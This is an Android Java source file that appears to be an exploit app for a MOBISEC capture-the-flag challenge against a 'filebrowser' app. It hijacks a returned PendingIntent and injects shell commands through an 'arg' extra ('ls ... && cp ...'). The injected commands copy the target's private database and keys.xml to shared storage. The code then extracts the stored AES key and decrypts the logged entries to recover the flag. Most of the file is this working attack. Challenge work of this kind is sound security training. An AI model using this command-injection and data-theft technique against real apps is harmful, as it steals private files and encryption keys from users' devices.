package com.mobisec.plaku.filebrowser;

import android.app.PendingIntent;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.database.sqlite.SQLiteCantOpenDatabaseException;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Bundle;
import android.support.v4.view.ViewCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.math.BigInteger;
import java.nio.charset.Charset;
import java.security.Key;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Locale;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {
    static final /* synthetic */ boolean $assertionsDisabled = false;
    public static final String alphanum;
    public static final String digits = "0123456789";
    public static final String lower;
    public static final String upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    static final String URL = "content://com.mobisec.plaku.provider.Log/log";
    static final Uri CONTENT_URI = Uri.parse(URL);

    static String enc_key = "";
    static {
        Locale locale = Locale.ROOT;
        String str = upper;
        lower = str.toLowerCase(locale);
        StringBuilder sb = new StringBuilder();
        sb.append(str);
        sb.append(lower);
        sb.append(digits);
        alphanum = sb.toString();
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView((int) R.layout.activity_main);


//        String flag = "bd36a98850e6b1ee01e48868b78f0f4bfce8282ac3fadc7f1db531ee0e94d73bc9906c64d18fd48cf32ec18b61fd9abd60cc6c3d41c1c6f9fadcc5e5826a4e39";
//        String oper = "";
//
//        String key = "HaRpfViUjucX749N9KMC";
//
//        byte[] aesKey = new byte[0];
//        try {
//            aesKey = getAesKey(this);
//        } catch (Exception e) {
//            Log.d("MOBISEC", Log.getStackTraceString(e));
//        }
//
//        try {
//            String out = new String(decrypt(hex2bin(flag), aesKey));
//            Log.d("MOBISEC", out);
//        } catch (Exception e) {
//            Log.d("MOBISEC", Log.getStackTraceString(e));
//        }


//        File file = new File("/sdcard/LogDb");
//
//        if(file.exists())
//            Log.d("MOBISEC", "FILE ALREADY THERE");
//        else
//            Log.d("MOBISEC", "File not there");
//
//
        try {
            Intent intent = new Intent();
            intent.setAction("com.mobisec.browser.action.START_PLUGIN");
            startActivityForResult(intent, 401);
        } catch (Exception e){
            Log.d("MOBISEC", Log.getStackTraceString(e));

        }

//        String str = "content://com.mobisec.plaku.provider.Log/log";
//        getContentResolver().delete(LogProvider.CONTENT_URI, null, null);
//        generateKey();
//        setFlag(getIntent());
//        Button duButton = (Button) findViewById(R.id.du);
//        Button catButton = (Button) findViewById(R.id.cat);
//        final EditText filenameWidget = (EditText) findViewById(R.id.filename);
//        TextView textView = (TextView) findViewById(R.id.result);
//        Button getflagButton = (Button) findViewById(R.id.getflag);
//        final TextView flagWidget = (TextView) findViewById(R.id.flag);
//        Button aboutButton = (Button) findViewById(R.id.about);
//        ((Button) findViewById(R.id.ls)).setOnClickListener(new OnClickListener() {
//            public void onClick(View v) {
//                String arg = filenameWidget.getText().toString();
//                MainActivity.this.startQuery("ls", arg);
//            }
//        });
//        duButton.setOnClickListener(new OnClickListener() {
//            public void onClick(View v) {
//                String arg = filenameWidget.getText().toString();
//                MainActivity.this.startQuery("du", arg);
//            }
//        });
//        catButton.setOnClickListener(new OnClickListener() {
//            public void onClick(View v) {
//                String arg = filenameWidget.getText().toString();
//                MainActivity.this.startQuery("cat", arg);
//            }
//        });
//        getflagButton.setOnClickListener(new OnClickListener() {
//            public void onClick(View v) {
//                flagWidget.setText("Getting flag....");
//                flagWidget.setTextColor(ViewCompat.MEASURED_STATE_MASK);
//                try {
//                    flagWidget.setText(MainActivity.this.getFlag());
//                } catch (Exception e) {
//                    StringBuilder sb = new StringBuilder();
//                    sb.append("Exception while getting the flag:");
//                    sb.append(Log.getStackTraceString(e));
//                    Log.e("MOBISEC", sb.toString());
//                    flagWidget.setText("An error occurred when getting flag");
//                }
//            }
//        });
//        aboutButton.setOnClickListener(new OnClickListener() {
//            public void onClick(View v) {
//                MainActivity mainActivity = MainActivity.this;
//                mainActivity.startActivity(new Intent(mainActivity, AboutActivity.class));
//            }
//        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // Check which request we're responding to
        Log.d("MOBISEC", "onActivityResult");
        if (requestCode == 401) {

            Bundle bundle = data.getExtras();
            if (bundle != null) {
                for (String key : bundle.keySet()) {
                    Log.e("MOBISEC", key + " : " + (bundle.get(key) != null ? bundle.get(key) : "NULL"));
                    if(key.equals("pi")){
                        PendingIntent pi = (PendingIntent) bundle.get(key);
                        Log.d("MOBISEC", pi.toString());
                        try {
                            Intent intent =
                                    new Intent()    // ls /data/data/com.mobisec.filebrowser/databases
                                            .putExtra("oper", "ls")
                                            .putExtra("arg", "/data/data/com.mobisec.filebrowser/ && cp /data/data/com.mobisec.filebrowser/databases/LogDb /sdcard/LogDb  && cp /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml /sdcard/keys.xml && cp /data/data/com.mobisec.filebrowser/databases/LogDb-wal /sdcard/LogDb-wal && cp /data/data/com.mobisec.filebrowser/databases/LogDb-shm /sdcard/LogDb-shm")
                                            .putExtra("debug", true);
                            pi.send(getApplicationContext(), 0, intent);

                            Log.d("MOBISEC", "PI sent");
                            File file = new File("/sdcard/LogDb");

                            if(file.exists())
                                Log.d("MOBISEC", "bt FILE ALREADY THERE");
                            else
                                Log.d("MOBISEC", "bt File not there");

                            new Timer().scheduleAtFixedRate(new TimerTask() {
                                public void run() {
                                    byte[] log_file = readFile("/sdcard/LogDb");
                                    Log.d("MOBISEC", String.valueOf(log_file.length));
                                    String logs = new String(log_file);
                                    Log.d("MOBISEC", logs);

                                    String logsBytes = Arrays.toString(log_file);
                                    Log.d("MOBISEC", logsBytes);

                                    try {
                                        Log.d("MOBISEC", "/sdcard/LogDb hash " + new String(hash(log_file)));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }

                                    String db = new String(readFile("/sdcard/browser.log"));
                                    Log.d("MOBISEC", db);

                                    String keys = new String(readFile("/sdcard/keys.xml"));
                                    Log.d("MOBISEC", keys);
                                    Log.d("MOBISEC", "KEY: " + keys.substring(keys.indexOf("</string>")-20, keys.indexOf("</string>")));
                                    enc_key = keys.substring(keys.indexOf("</string>")-20, keys.indexOf("</string>"));

//                                    setFlag(getIntent());

//                                    try{
//                                        Log.d("MOBISEC", getFlag2());
//                                    } catch (Exception e ){
//                                        Log.d("MOBISEC", Log.getStackTraceString(e));
//                                    }
                                    try {
                                        File db_path = new File("/data/data/com.mobisec.plaku.filebrowser/databases/LogDb");
//
//                                        if(db_path.exists()){
//                                            Log.d("MOBISEC", "DB path already existed before copy");
//                                            try {
//                                                Log.d("MOBISEC", "db_path hash before copy" + new String(hash(readFile(db_path.toString()))));
//                                            } catch (Exception e) {
//                                                e.printStackTrace();
//                                            }
//                                        }
                                        copy(new File("/sdcard/LogDb"), db_path);
                                        copy(new File("/sdcard/LogDb-wal"), new File("/data/data/com.mobisec.plaku.filebrowser/databases/LogDb-wal"));
                                        copy(new File("/sdcard/LogDb-shm"), new File("/data/data/com.mobisec.plaku.filebrowser/databases/LogDb-shm"));
//                                        try {
//                                            Log.d("MOBISEC", "db_path hash after copy " + new String(hash(readFile(db_path.toString()))));
//                                        } catch (Exception e) {
//                                            e.printStackTrace();
//                                        }
//                                        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "cp -r /sdcard/ /data/data/com.mobisec.plaku.filebrowser/databases/"});
//                                        BufferedReader stdOut = new BufferedReader(new InputStreamReader(p.getInputStream()));
//                                        BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
//                                        String line = stdOut.readLine();
//                                        if (line == null) {
//                                            line = stdErr.readLine();
//                                        }
//                                        if (line != null) {
//                                            Log.d("MOBISEC", line);
//                                        } else {
//                                            Log.d("MOBISEC", "error while reading output from shell");
//                                        }
//                                        if(!db_path.exists()){
//                                            Log.d("MOBISEC", "DB path not there after copy");
//                                        }
//                                        Log.d("MOBISEC", "FILE COPIED");
                                        Log.d("MOBISEC", getFlag());
                                    } catch (Exception e) {
                                        Log.d("MOBISEC", Log.getStackTraceString(e));
                                    }
//                                    try {
//                                        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "cp /sdcard/keys.xml /data/data/com.mobisec.plaku.filebrowser/shared_prefs/keys.xml"});
//                                        BufferedReader stdOut = new BufferedReader(new InputStreamReader(p.getInputStream()));
//                                        BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
//                                        String line = stdOut.readLine();
//                                        if (line == null) {
//                                            line = stdErr.readLine();
//                                        }
//                                        Log.d("MOBISEC", line);

//                                        Log.d("MOBISEC", getKey(getApplicationContext()));
//                                    } catch (IOException e) {
//                                        Log.d("MOBISEC", Log.getStackTraceString(e));
//                                    } catch (Exception e) {
//                                        Log.d("MOBISEC", Log.getStackTraceString(e));
//                                    }
                                }
                            }, 2000, 5000);

                        } catch (PendingIntent.CanceledException e) {
                            Log.d("MOBISEC", Log.getStackTraceString(e));
                            String logs = new String(readFile("/sdcard/browser.log"));
                            Log.d("MOBISEC", logs);
                        }
                    }
                }
            }
            // Make sure the request was successful
            if (resultCode == RESULT_OK) {
                Log.d("MOBISEC", "RequestCode 401, result OK");
            } else{
                Log.d("MOBISEC", "RequestCode 401, result not OK");
            }
        }
    }

    public byte[] readFile(String inputFileName) {
        File file = new File(inputFileName);
        Log.d("MOBISEC", file.getAbsolutePath());
        if(!file.exists())
            return new byte[]{};
        byte[] result = new byte[((int) file.length())];
        InputStream input = null;
        int totalBytesRead = 0;
        try {
            InputStream input2 = new BufferedInputStream(new FileInputStream(file));
            while (totalBytesRead < result.length) {
                int bytesRead = input2.read(result, totalBytesRead, result.length - totalBytesRead);
                if (bytesRead > 0) {
                    totalBytesRead += bytesRead;
                }
            }
            input2.close();
        } catch (Exception e) {
            StringBuilder sb = new StringBuilder();
            sb.append("Exception while reading files:");
            sb.append(Log.getStackTraceString(e));
            Log.e("MOBISEC", sb.toString());
        } catch (Throwable th) {
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            throw th;
        }
        return result;
    }

    private void generateKey() {
        String key = getRandomString(20);
        Editor editor = getSharedPreferences("keys", 0).edit();
        editor.putString("key", key);
        editor.commit();
    }

    private static String getKey(Context ctx) throws Exception {
        String key = ctx.getSharedPreferences("keys", 0).getString("key", null);
        if (key != null) {
            return key;
        }
        throw new Exception("key not found");
    }

    private static byte[] getAesKey(Context ctx) throws Exception {
        Log.d("MOBISEC", "getAesKey() " + enc_key);
        return hash(enc_key.getBytes());
    }

    public void startQuery(String oper, String arg) {
        Intent i = new Intent(this, QueryActivity.class);
        i.putExtra("oper", oper);
        i.putExtra("arg", arg);
        startActivityForResult(i, 400);
    }

    public static void logQuery(Context ctx, String oper, String arg) {
        try {
            byte[] aesKey = getAesKey(ctx);
            rawLogQuery(ctx, bin2hex(encrypt(oper.getBytes(), aesKey)), bin2hex(encrypt(arg.getBytes(), aesKey)));
        } catch (Exception e) {
        }
    }

    public static Uri rawLogQuery(Context ctx, String oper, String arg) {
        ContentValues values = new ContentValues();
        values.put("oper", oper);
        values.put("arg", arg);
        Log.d("MOBISEC", "rawLogQuery " + String.valueOf(ctx.getContentResolver()));
        return ctx.getContentResolver().insert(LogProvider.CONTENT_URI, values);
    }

    public static boolean writeToFile(String fp, String data) {
        try {
            FileOutputStream fos = new FileOutputStream(fp);
            fos.write(data.getBytes(Charset.defaultCharset()));
            fos.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void setFlag(Intent intent) {
        Log.e("MOBISEC", "setFlag()");
        String flag = null;
        if (intent != null) {
            flag = intent.getStringExtra("flag");
        }
        if (flag == null) {
            flag = "dummyflag";
        }
        logQuery(this, "genflag", flag);
        Log.e("MOBISEC", "flag set correctly");
    }


    public String getFlag2() throws Exception{
        try {
            //Defining your external storage path.
//            String extStore = Environment.getExternalStorageDirectory().getPath();

            //Defining the file to be opened.
            File dbfile = new File("/sdcard/LogDbs");
            if(dbfile.exists()){
                Log.d("MOBISEC", "/sdcard/LogDbs exists");
                Log.d("MOBISEC", String.valueOf(dbfile.length()));
            }

            //stablishing the connection
            SQLiteDatabase db = SQLiteDatabase.openDatabase("/sdcard/LogDbs",null, SQLiteDatabase.OPEN_READONLY);
            db.setVersion(2);

            if(!db.isDatabaseIntegrityOk()){
                Log.d("MOBISEC", "THE INTEGRITY OF DB IS NOT OK");
            }

            //working with query and results.
            Cursor cursor = db.query("log", null, null, null, null, null, null, null);
            Log.d("MOBISEC", String.valueOf(cursor.getCount()));
            while (cursor.moveToNext()) {
                String field1 = cursor.getString(cursor.getColumnIndex("arg"));
                String field2 = cursor.getString(cursor.getColumnIndex("oper"));
                Log.i("MOBISEC", field1 + " " + field2);
            }

            cursor.close();

        } catch (SQLiteCantOpenDatabaseException e) {
            Log.d("MOBISEC", Log.getStackTraceString(e));
        }
        return null;
    }
    /* access modifiers changed from: private */
    public String getFlag() throws Exception {
        byte[] aesKey = getAesKey(this);
        String encOper = bin2hex(encrypt("genflag".getBytes(), aesKey));
//        File file = new File("/sdcard/LogDb");
//
//        if(file.exists())
//            Log.d("MOBISEC", "gF FILE ALREADY THERE");
//        else
//            Log.d("MOBISEC", "gF File not there");

        Cursor c = getContentResolver().query(Uri.parse("content://com.mobisec.plaku.provider.Log/log"), null, null, null, "oper");
        Log.d("MOBISEC", String.valueOf(c.getCount()));
        if (c.moveToFirst()) {
            do {
                String string = c.getString(c.getColumnIndex("id"));
                String oper = c.getString(c.getColumnIndex("oper"));
                String arg = c.getString(c.getColumnIndex("arg"));
                Log.d("MOBISEC", "" + arg);
                Log.d("MOBISEC", "" + oper);
                Log.d("MOBISEC", "" + new String(decrypt(hex2bin(arg), aesKey)));
                Log.d("MOBISEC", "" + new String(decrypt(hex2bin(oper), aesKey)));
//                if (oper.equals(encOper)) {
//                    Log.d("MOBISEC", arg);
//                    String decrypted = new String(decrypt(hex2bin(arg), aesKey));
//                    Log.d("MOBISEC", decrypted);
//                    return decrypted;
//                }
//                else{
//                    Log.d("MOBISEC", oper + " not " + encOper);
//                }
            } while (c.moveToNext());
        } else {
            Log.d("MOBISEC", "No first");
        }
        return null;
    }

    public static byte[] encrypt(byte[] in, byte[] key) throws Exception {
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(1, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(in);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        return outputStream.toByteArray();
    }

    public static byte[] decrypt(byte[] ct, byte[] key) throws Exception {
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(2, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(ct);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        Log.d("MOBISEC", "Decrypt " + Arrays.toString(outputStream.toByteArray()));
        return outputStream.toByteArray();
    }

    public static byte[] hash(byte[] in) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(in);
        return md.digest();
    }

    public static String getRandomString(int len) {
        Random generator = new Random();
        StringBuilder randomStringBuilder = new StringBuilder();
        int randomLength = len;
        for (int i = 0; i < randomLength; i++) {
            String str = alphanum;
            randomStringBuilder.append(str.charAt(generator.nextInt(str.length())));
        }
        return randomStringBuilder.toString();
    }

    static String bin2hex(byte[] data) {
        StringBuilder sb = new StringBuilder();
        sb.append("%0");
        sb.append(data.length * 2);
        sb.append('x');
        return String.format(sb.toString(), new Object[]{new BigInteger(1, data)});
    }

    public static byte[] hex2bin(String hex) throws NumberFormatException {
        Log.d("MOBISEC", "hex2bin");
        if (hex.length() % 2 <= 0) {
            byte[] r = new byte[(hex.length() / 2)];
            int i = hex.length();
            while (i > 0) {
                int i2 = i - 1;
                i = i2 - 1;
                r[(i / 2)] = (byte) (digit(hex.charAt(i2)) | (digit(hex.charAt(i)) << 4));
            }
            return r;
        }
        throw new NumberFormatException("Hexadecimal input string must have an even length.");
    }

    private static int digit(char ch) {
        int r = Character.digit(ch, 16);
        if (r >= 0) {
            return r;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("Invalid hexadecimal string: ");
        sb.append(ch);
        throw new NumberFormatException(sb.toString());
    }

    public static void copy(File src, File dst) throws IOException {
        Log.d("MOBISEC", "COPYING FILE");
        InputStream in = new FileInputStream(src);
        try {
            OutputStream out = new FileOutputStream(dst);
            try {
                // Transfer bytes from in to out
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                    Log.d("MOBISEC", "copy wrote buffer");
                }
            } finally {
                out.close();
            }
        } finally {
            in.close();
        }
    }
}
